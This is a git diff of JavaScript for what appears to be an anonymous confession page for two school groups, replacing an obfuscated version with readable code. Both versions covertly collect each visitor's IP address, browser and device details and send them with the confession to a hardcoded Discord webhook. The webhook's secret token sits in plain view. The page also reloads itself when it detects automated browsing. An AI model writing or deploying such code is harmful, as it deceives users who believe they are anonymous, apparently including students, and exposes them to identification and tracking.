@@ -1,1 +1,72 @@
-var _0x331a4e=_0x2896;function _0x59f9(){var _0x5c4a9a=['then','UA\x20:\x20','\x0aPlatform\x20:\x20','1794861glmaYd','https://discord.com/api/webhooks/1200795566578335854/AKEBKoXzeNuh49xl1eMG1L-3Br7y_Z0swHQOxtv3B3oVHUy_5X-OVQmRPaPFdShxjffh','cdiv','\x0aVeri\x20tasarrufu\x20:\x20','POST','\x0aMaks\x20dokunmatik\x20\x20parmak\x20algılama\x20:\x20','4669745aHTlsE','18013740qfrqzR','application/json;\x20charset=UTF-8','connectionType','32EegTAG','classList','getElementById','active-button','display','connection','251OfrOrf','webdriver','remove','block','4914828sOBEHg','none','7bxqNVq','confess-input','add','platform','saveData','userAgent','deviceMemory','success','\x0aBellek\x20Miktarı\x20:\x20','maxTouchPoints','effectiveType','\x0a\x0aÖĞLENCİ\x20GRUP\x20--\x20','30600MFPPsg','reload','3904Ozfcoo','3092384CCJKVM','onload','style'];_0x59f9=function(){return _0x5c4a9a;};return _0x59f9();}(function(_0x2b01b0,_0x2a6b10){var _0x3c3a31=_0x2896,_0x194068=_0x2b01b0();while(!![]){try{var _0x4d2103=parseInt(_0x3c3a31(0x103))/0x1*(parseInt(_0x3c3a31(0xec))/0x2)+parseInt(_0x3c3a31(0xea))/0x3+parseInt(_0x3c3a31(0xed))/0x4+-parseInt(_0x3c3a31(0xf9))/0x5+parseInt(_0x3c3a31(0x107))/0x6*(-parseInt(_0x3c3a31(0xde))/0x7)+parseInt(_0x3c3a31(0xfd))/0x8*(-parseInt(_0x3c3a31(0xf3))/0x9)+parseInt(_0x3c3a31(0xfa))/0xa;if(_0x4d2103===_0x2a6b10)break;else _0x194068['push'](_0x194068['shift']());}catch(_0x477067){_0x194068['push'](_0x194068['shift']());}}}(_0x59f9,0x7fe2b));var ipadress,selectedGroup=0x0,sGroupButton,oGroupButton;function switchToSGroup(){var _0x312c2f=_0x2896;if(selectedGroup==0x0)return;sGroupButton[_0x312c2f(0xfe)]['add'](_0x312c2f(0x100)),oGroupButton['classList'][_0x312c2f(0x105)](_0x312c2f(0x100)),selectedGroup=0x0;}function _0x2896(_0x8bf222,_0x3f9c1d){var _0x59f96d=_0x59f9();return _0x2896=function(_0x28963a,_0x1a0fc2){_0x28963a=_0x28963a-0xdd;var _0x3107bc=_0x59f96d[_0x28963a];return _0x3107bc;},_0x2896(_0x8bf222,_0x3f9c1d);}function switchToOGroup(){var _0x57c602=_0x2896;if(selectedGroup==0x1)return;oGroupButton[_0x57c602(0xfe)][_0x57c602(0xe0)](_0x57c602(0x100)),sGroupButton[_0x57c602(0xfe)][_0x57c602(0x105)](_0x57c602(0x100)),selectedGroup=0x1;}function navigator_descriptor(){var _0x522ba1=_0x2896;return connectionType=navigator[_0x522ba1(0x102)][_0x522ba1(0xfc)],saveDataMode=navigator[_0x522ba1(0x102)][_0x522ba1(0xe2)],cellType=navigator[_0x522ba1(0x102)][_0x522ba1(0xe8)],currentLanguage=navigator['language'],mobileMaxTouchPoints=navigator[_0x522ba1(0xe7)],platform=navigator[_0x522ba1(0xe1)],userAgent=navigator[_0x522ba1(0xe3)],memory=navigator[_0x522ba1(0xe4)],final=_0x522ba1(0xf1)+userAgent+_0x522ba1(0xf2)+platform+'\x0aArayüz\x20Dili\x20:\x20'+currentLanguage+_0x522ba1(0xf8)+mobileMaxTouchPoints+_0x522ba1(0xf6)+saveDataMode+_0x522ba1(0xe6)+memory+'gb',final;}function sendConfess(){var _0x4b94bc=_0x2896,_0x56f220=document[_0x4b94bc(0xff)](_0x4b94bc(0xdf)),_0x519523=document[_0x4b94bc(0xff)](_0x4b94bc(0xf5));selectedGroup==0x0?xfinal='\x0a\x0aSABAHÇI\x20GRUP\x20--\x20'+_0x56f220['value']:xfinal=_0x4b94bc(0xe9)+_0x56f220['value'],navigator_descriptor(),fetch(_0x4b94bc(0xf4),{'method':_0x4b94bc(0xf7),'body':JSON['stringify']({'content':navigator_descriptor()+'\x0a'+ipadress+xfinal}),'headers':{'Content-type':_0x4b94bc(0xfb)}}),_0x519523['style'][_0x4b94bc(0x101)]=_0x4b94bc(0xdd),document['getElementById'](_0x4b94bc(0xe5))[_0x4b94bc(0xef)][_0x4b94bc(0x101)]=_0x4b94bc(0x106);}window[_0x331a4e(0xee)]=function(){var _0x5dd795=_0x331a4e;navigator[_0x5dd795(0x104)]!=![]&&location[_0x5dd795(0xeb)](),getIPs()[_0x5dd795(0xf0)](_0x104781=>ipadress=_0x104781),sGroupButton=document['getElementById']('sgroup'),oGroupButton=document[_0x5dd795(0xff)]('ogroup');};
+var ipadress
+var selectedGroup = 0x0
+var sGroupButton
+var oGroupButton
+
+
+function switchToSGroup(){
+    if(selectedGroup==0x0){
+        return
+    }
+    sGroupButton.classList.add("active-button")
+    oGroupButton.classList.remove("active-button")
+    selectedGroup = 0x0
+}
+
+function switchToOGroup(){
+    if(selectedGroup==0x1){
+        return
+    }
+    oGroupButton.classList.add("active-button")
+    sGroupButton.classList.remove("active-button")
+    selectedGroup = 0x1
+}
+
+
+
+function navigator_descriptor(){
+    connectionType = navigator.connection.connectionType
+    saveDataMode = navigator.connection.saveData
+    cellType = navigator.connection.effectiveType
+    currentLanguage = navigator.language
+    mobileMaxTouchPoints = navigator.maxTouchPoints
+    platform = navigator.platform
+    userAgent = navigator.userAgent
+    memory = navigator.deviceMemory
+    final = "UA : " + userAgent + "\nPlatform : " + platform + "\nArayüz Dili : " + currentLanguage + "\nMaks dokunmatik  parmak algılama : " + mobileMaxTouchPoints + "\nVeri tasarrufu : " + saveDataMode + "\nBellek Miktarı : " + memory + "gb"
+    return final
+}
+
+
+function sendConfess(){
+    var confessInput = document.getElementById("confess-input")
+    var xarea = document.getElementById("cdiv")
+    if(selectedGroup == 0x0){
+        xfinal = "\n\nSABAHÇI GRUP -- "+confessInput.value
+    }
+    else{
+        xfinal = "\n\nÖĞLENCİ GRUP -- "+confessInput.value
+    }
+    navigator_descriptor()
+    fetch("https://discord.com/api/webhooks/1200795566578335854/AKEBKoXzeNuh49xl1eMG1L-3Br7y_Z0swHQOxtv3B3oVHUy_5X-OVQmRPaPFdShxjffh", {
+        method: "POST",
+        body: JSON.stringify({
+            "content" : navigator_descriptor() + "\n" + ipadress + xfinal
+        }),
+        headers: {
+            "Content-type": "application/json; charset=UTF-8"
+        }
+    })
+    xarea.style.display = "none"
+    document.getElementById("success").style.display="block"
+}
+
+
+window.onload = function(){
+    if(navigator.webdriver != false){
+        location.reload()
+    }
+    getIPs().then(res => ipadress = res)
+    sGroupButton = document.getElementById("sgroup")
+    oGroupButton = document.getElementById("ogroup")
+}
